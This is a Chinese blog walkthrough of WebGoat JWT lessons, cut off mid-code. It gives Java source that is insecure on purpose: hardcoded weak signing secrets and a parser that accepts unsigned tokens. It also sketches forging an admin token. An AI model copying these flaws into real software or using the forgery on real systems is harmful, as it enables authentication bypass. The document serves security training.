<h2 id="jwt-1"><a href="#jwt-1" class="headerlink" title="jwt"></a>jwt</h2><h3 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.jwt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Category;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JWT</span> <span class="keyword">extends</span> <span class="title class_">Lesson</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Category <span class="title function_">getDefaultCategory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Category.A7;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTitle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;jwt.title&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="JWTDecodeEndpoint"><a href="#JWTDecodeEndpoint" class="headerlink" title="JWTDecodeEndpoint"></a>JWTDecodeEndpoint</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.jwt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JWTDecodeEndpoint</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/JWT/decode&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">decode</span><span class="params">(<span class="meta">@RequestParam(&quot;jwt-encode-user&quot;)</span> String user)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;user&quot;</span>.equals(user))&#123;</span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接打开webwolf 解码一下即可</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911210122147.png" alt="image-20220911210122147"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220911210131002.png" alt="image-20220911210131002"></p>
<h3 id="JWTVotesEndpoint"><a href="#JWTVotesEndpoint" class="headerlink" title="JWTVotesEndpoint"></a>JWTVotesEndpoint</h3><h3 id="votes"><a href="#votes" class="headerlink" title="votes"></a>votes</h3><h4 id="Vote"><a href="#Vote" class="headerlink" title="Vote"></a>Vote</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.jwt.votes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.annotation.JsonView;</span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Getter</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Vote</span> &#123;</span><br><span class="line">    <span class="meta">@JsonView(Views.GuestView.class)</span></span><br><span class="line"><span class="comment">//    表示只能反序列成这个类?</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String title;</span><br><span class="line">    <span class="meta">@JsonView(Views.GuestView.class)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String information;</span><br><span class="line">    <span class="meta">@JsonView(Views.GuestView.class)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String imageSmall;</span><br><span class="line">    <span class="meta">@JsonView(Views.GuestView.class)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String imageBig;</span><br><span class="line">    <span class="meta">@JsonView(Views.UserView.class)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> numberOfVotes;</span><br><span class="line">    <span class="meta">@JsonView(Views.UserView.class)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">votingAllowed</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="meta">@JsonView(Views.UserView.class)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> <span class="variable">average</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Vote</span><span class="params">(String title, String information, String imageSmall, String imageBig, <span class="type">int</span> numberOfVotes,<span class="type">int</span> totalVotes)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.title = title;</span><br><span class="line">        <span class="built_in">this</span>.information = information;</span><br><span class="line">        <span class="built_in">this</span>.imageSmall = imageSmall;</span><br><span class="line">        <span class="built_in">this</span>.imageBig = imageBig;</span><br><span class="line">        <span class="built_in">this</span>.numberOfVotes = numberOfVotes;</span><br><span class="line">        <span class="built_in">this</span>.average = calculateStars(totalVotes);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">incrementNumberOfVotes</span><span class="params">(<span class="type">int</span> totalVotes)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.numberOfVotes = <span class="built_in">this</span>.numberOfVotes +<span class="number">1</span>;</span><br><span class="line">        <span class="built_in">this</span>.average = calculateStars(totalVotes);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reset</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.numberOfVotes = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">this</span>.average = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> <span class="title function_">calculateStars</span><span class="params">(<span class="type">int</span> totalVotes)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Math.round(((<span class="type">double</span>) numberOfVotes / (<span class="type">double</span>) totalVotes) * <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Views"><a href="#Views" class="headerlink" title="Views"></a>Views</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.jwt.votes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Views</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">GuestView</span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserView</span> <span class="keyword">extends</span> <span class="title class_">GuestView</span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="JWTVotesEndpoint-1"><a href="#JWTVotesEndpoint-1" class="headerlink" title="JWTVotesEndpoint"></a>JWTVotesEndpoint</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.jwt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.lessons.jwt.votes.Views;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.lessons.jwt.votes.Vote;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.*;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.impl.TextCodec;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.converter.json.MappingJacksonValue;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.annotation.PostConstruct;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.sql.Date;</span><br><span class="line"><span class="keyword">import</span> java.time.Duration;</span><br><span class="line"><span class="keyword">import</span> java.time.Instant;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.stream.Collectors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.util.Comparator.comparingLong;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.util.Optional.ofNullable;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.util.stream.Collectors.toList;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;jwt-change-token-hint1&quot;, &quot;jwt-change-token-hint2&quot;, &quot;jwt-change-token-hint3&quot;, &quot;jwt-change-token-hint4&quot;, &quot;jwt-change-token-hint5&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JWTVotesEndpoint</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">JWT_PASSWORD</span> <span class="operator">=</span> TextCodec.BASE64.encode(<span class="string">&quot;victory&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">validUsers</span> <span class="operator">=</span> <span class="string">&quot;TomJerrySylvester&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">totalVotes</span> <span class="operator">=</span> <span class="number">38929</span>;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, Vote&gt; votes = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostConstruct</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initVotes</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">//        存入几个初始值</span></span><br><span class="line">        votes.put(<span class="string">&quot;Admin lost password&quot;</span>, <span class="keyword">new</span> <span class="title class_">Vote</span>(<span class="string">&quot;Admin lost password&quot;</span>,</span><br><span class="line">                <span class="string">&quot;In this challenge you will need to help the admin and find the password in order to login&quot;</span>,</span><br><span class="line">                <span class="string">&quot;challenge1-small.png&quot;</span>, <span class="string">&quot;challenge1.png&quot;</span>, <span class="number">36000</span>, totalVotes));</span><br><span class="line">        votes.put(<span class="string">&quot;Vote for your favourite&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Vote</span>(<span class="string">&quot;Vote for your favourite&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;In this challenge ...&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;challenge5-small.png&quot;</span>, <span class="string">&quot;challenge5.png&quot;</span>, <span class="number">30000</span>, totalVotes));</span><br><span class="line">        votes.put(<span class="string">&quot;Get it for free&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Vote</span>(<span class="string">&quot;Get it for free&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;The objective for this challenge is to buy a Samsung phone for free.&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;challenge2-small.png&quot;</span>, <span class="string">&quot;challenge2.png&quot;</span>, <span class="number">20000</span>, totalVotes));</span><br><span class="line">        votes.put(<span class="string">&quot;Photo comments&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Vote</span>(<span class="string">&quot;Photo comments&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;n this challenge you can comment on the photo you will need to find the flag somewhere.&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;challenge3-small.png&quot;</span>, <span class="string">&quot;challenge3.png&quot;</span>, <span class="number">10000</span>, totalVotes));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/JWT/votings/login&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">login</span><span class="params">(<span class="meta">@RequestParam(&quot;user&quot;)</span> String user, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (validUsers.contains(user)) &#123;</span><br><span class="line"><span class="comment">//            这里如果user是预定义的 几个的话</span></span><br><span class="line">            <span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span> Jwts.claims().setIssuedAt(Date.from(Instant.now().plus(Duration.ofDays(<span class="number">10</span>))));</span><br><span class="line"><span class="comment">//            设置jwt发布时间戳</span></span><br><span class="line">            claims.put(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">            claims.put(<span class="string">&quot;user&quot;</span>, user);</span><br><span class="line">            <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> Jwts.builder()</span><br><span class="line">                    .setClaims(claims)</span><br><span class="line">                    .signWith(SignatureAlgorithm.HS512, JWT_PASSWORD)</span><br><span class="line"><span class="comment">//                    hs512 加密 密钥是victory</span></span><br><span class="line">                    .compact();</span><br><span class="line">            <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cookie</span>(<span class="string">&quot;access_token&quot;</span>, token);</span><br><span class="line"><span class="comment">//            添加cookie进去</span></span><br><span class="line">            response.addCookie(cookie);</span><br><span class="line">            response.setStatus(HttpStatus.OK.value());</span><br><span class="line">            response.setContentType(MediaType.APPLICATION_JSON_VALUE);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cookie</span>(<span class="string">&quot;access_token&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            response.addCookie(cookie);</span><br><span class="line">            response.setStatus(HttpStatus.OK.value());</span><br><span class="line">            response.setContentType(MediaType.APPLICATION_JSON_VALUE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/JWT/votings&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> MappingJacksonValue <span class="title function_">getVotes</span><span class="params">(<span class="meta">@CookieValue(value = &quot;access_token&quot;, required = false)</span> String accessToken)</span> &#123;</span><br><span class="line">        <span class="type">MappingJacksonValue</span> <span class="variable">value</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MappingJacksonValue</span>(votes.values().stream().sorted(comparingLong(Vote::getAverage).reversed()).collect(toList()));</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isEmpty(accessToken)) &#123;</span><br><span class="line"><span class="comment">//            如果token是空的</span></span><br><span class="line">            value.setSerializationView(Views.GuestView.class);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Jwt</span> <span class="variable">jwt</span> <span class="operator">=</span> Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);</span><br><span class="line"><span class="comment">//                设置密钥去解密</span></span><br><span class="line">                <span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span> (Claims) jwt.getBody();</span><br><span class="line">                <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> (String) claims.get(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;Guest&quot;</span>.equals(user) || !validUsers.contains(user)) &#123;</span><br><span class="line">                    value.setSerializationView(Views.GuestView.class);</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    value.setSerializationView(Views.UserView.class);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (JwtException e) &#123;</span><br><span class="line">                value.setSerializationView(Views.GuestView.class);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(value = &quot;/JWT/votings/&#123;title&#125;&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@ResponseStatus(HttpStatus.ACCEPTED)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;?&gt; vote(<span class="meta">@PathVariable</span> String title,<span class="meta">@CookieValue(value = &quot;access_token&quot;,required = false)</span>String accessToken)&#123;</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isEmpty(accessToken))&#123;</span><br><span class="line">            <span class="keyword">return</span> ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Jwt</span> <span class="variable">jwt</span> <span class="operator">=</span> Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);</span><br><span class="line">                <span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span>(Claims) jwt.getBody();</span><br><span class="line">                <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> (String) claims.get(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (!validUsers.contains(user))&#123;</span><br><span class="line">                    <span class="keyword">return</span> ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    ofNullable(votes.get(title)).ifPresent(v -&gt; v.incrementNumberOfVotes(totalVotes));</span><br><span class="line"><span class="comment">//                    这一步首先是获取投票的是哪一个并且将票数取出来接着进行 +1操作</span></span><br><span class="line">                    <span class="keyword">return</span> ResponseEntity.accepted().build();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (JwtException e)&#123;</span><br><span class="line">                <span class="keyword">return</span> ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/JWT/votings&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">restVotes</span><span class="params">(<span class="meta">@CookieValue(value = &quot;access_token&quot;,required = false)</span>String accessToken)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isEmpty(accessToken))&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;jwt-invalid-token&quot;</span>).build();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Jwt</span> <span class="variable">jwt</span> <span class="operator">=</span> Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);</span><br><span class="line">                <span class="comment">// 注意这个parse函数 其实是不安全的 后面会讲到</span></span><br><span class="line">                <span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span> (Claims) jwt.getBody();</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isAdmin</span> <span class="operator">=</span> Boolean.valueOf((String)claims.get(<span class="string">&quot;admin&quot;</span>));</span><br><span class="line"><span class="comment">//                对签名进行解密后确认是否是admin</span></span><br><span class="line">                <span class="keyword">if</span> (!isAdmin)&#123;</span><br><span class="line">                    <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;jwt-only-admin&quot;</span>).build();</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    votes.values().forEach(vote -&gt; vote.reset());</span><br><span class="line">                    <span class="keyword">return</span> success(<span class="built_in">this</span>).build();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (JwtException e)&#123;</span><br><span class="line">                <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;jwt-invalid-token&quot;</span>).output(e.toString()).build();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的目的是让我们 删除重置投票</p>
<p>这里先哪一个 token</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912184217753.png" alt="image-20220912184217753"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912184256942.png" alt="image-20220912184256942"></p>
<p>注意这里多加了个 .</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912184337398.png" alt="image-20220912184337398"></p>
<h3 id="JWTQuiz"><a href="#JWTQuiz" class="headerlink" title="JWTQuiz"></a>JWTQuiz</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.jwt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JWTQuiz</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String[] solutions = &#123;<span class="string">&quot;Solution 1&quot;</span>,<span class="string">&quot;Solution 2&quot;</span>&#125;;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">boolean</span>[] guesses = <span class="keyword">new</span> <span class="title class_">boolean</span>[solutions.length];</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/JWT/quiz&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String[] question_0_solution, <span class="meta">@RequestParam</span> String[] question_1_solution)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">correctAnswers</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        String[] givenAnswers = &#123;question_0_solution[<span class="number">0</span>],question_1_solution[<span class="number">0</span>]&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i= <span class="number">0</span>; i&lt; solutions.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (givenAnswers[i].contains(solutions[i]))&#123;</span><br><span class="line">                correctAnswers++;</span><br><span class="line">                guesses[i] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                guesses[i] = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (correctAnswers == solutions.length)&#123;</span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/JWT/quiz&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span>[] getResults()&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.guesses;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里是问我们下面两段程序都会出现什么现象</p>
<p>重点就在下面的两个函数上面 我们先去看一下源文档</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912184414021.png" alt="image-20220912184414021"></p>
<p>这里只能解密带密钥的jwt </p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912184550440.png" alt="image-20220912184550440"></p>
<p>这里两个都可以 答案就很明显了</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912184611212.png" alt="image-20220912184611212"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220912184637729.png" alt="image-20220912184637729"></p>
<h3 id="JWTSecretKeyEndpoint"><a href="#JWTSecretKeyEndpoint" class="headerlink" title="JWTSecretKeyEndpoint"></a>JWTSecretKeyEndpoint</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.jwt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Claims;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Jwt;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Jwts;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.SignatureAlgorithm;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.impl.TextCodec;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Date;</span><br><span class="line"><span class="keyword">import</span> java.time.Instant;</span><br><span class="line"><span class="keyword">import</span> java.util.Calendar;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;jwt-secret-hint1&quot;, &quot;jwt-secret-hint2&quot;, &quot;jwt-secret-hint3&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JWTSecretKeyEndpoint</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] SECRETS = &#123;<span class="string">&quot;victory&quot;</span>,<span class="string">&quot;business&quot;</span>,<span class="string">&quot;available&quot;</span>,<span class="string">&quot;shipping&quot;</span>,<span class="string">&quot;washington&quot;</span>&#125;;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">JWT_SECRET</span> <span class="operator">=</span> TextCodec.BASE64.encode(SECRETS[<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(SECRETS.length)]);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">WEBGOAT_USER</span> <span class="operator">=</span> <span class="string">&quot;WebGoat&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; expectedClaims = List.of(<span class="string">&quot;iss&quot;</span>,<span class="string">&quot;iat&quot;</span>,<span class="string">&quot;exp&quot;</span>,<span class="string">&quot;aud&quot;</span>,<span 